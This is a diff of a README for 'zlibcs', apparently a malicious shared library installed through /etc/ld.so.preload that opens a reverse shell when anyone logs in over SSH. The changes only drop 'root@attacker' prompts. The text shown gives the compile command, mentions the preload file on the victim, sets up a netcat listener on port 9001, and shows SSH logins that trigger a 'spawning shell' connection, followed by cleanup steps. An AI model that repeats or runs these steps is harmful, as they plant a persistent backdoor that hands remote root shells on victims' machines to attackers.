@@ -1,10 +1,9 @@
-
 zlibcs
 
 
 Compile:
 ```bash
-root@attacker:~# gcc zlibcs.c -o zlibcs.so -fPIC -shared -ldl -D_GNU_SOURCE
+gcc zlibcs.c -o zlibcs.so -fPIC -shared -ldl -D_GNU_SOURCE
 ```
 
 ## Installation
@@ -41,20 +40,20 @@ root@victim:~# cat /etc/ld.so.preload
 1. Install as above
 2. Start a listener to receive reverse shell
 ```bash
-root@attacker:~# nc -lvnp 9001
+nc -lvnp 9001
 ```
 3. SSH to the target machine. A shell should spawn on your listener.
 It (almost) always doens't work the first time, so SSH twice.
 ```bash
-root@attacker:~# ssh hey@10.11.0.56
+ssh hey@10.11.0.56
 hey@10.11.0.56's password:
 ^C
-root@attacker:~# ssh hey@10.11.0.56
+ssh hey@10.11.0.56
 hey@10.11.0.56's password:
 ^C
 ```
 ```bash
-root@attacker:~# nc -lvnp 9001
+nc -lvnp 9001
 [...]
 Connection received
 [+] spawning shell... 
@@ -69,4 +68,3 @@ Nothing else needed.
 root@victim:~# rm /etc/ld.so.preload
 root@victim:~# rm /lib/x86_64-linux-gnu/zlibcs.so
 ```
-
